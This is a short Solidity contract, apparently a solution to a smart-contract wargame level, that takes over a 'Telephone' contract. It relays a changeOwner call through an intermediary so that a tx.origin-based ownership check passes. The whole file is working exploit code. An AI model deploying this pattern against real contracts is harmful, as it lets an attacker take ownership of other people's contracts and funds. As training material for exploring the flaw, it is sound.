// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
	function changeOwner(address _owner) external;
}

contract TelephonePhishing {

	function changeOwner(address _telephone) external {
		ITelephone telephone = ITelephone(_telephone);
		telephone.changeOwner(msg.sender);
	}

}
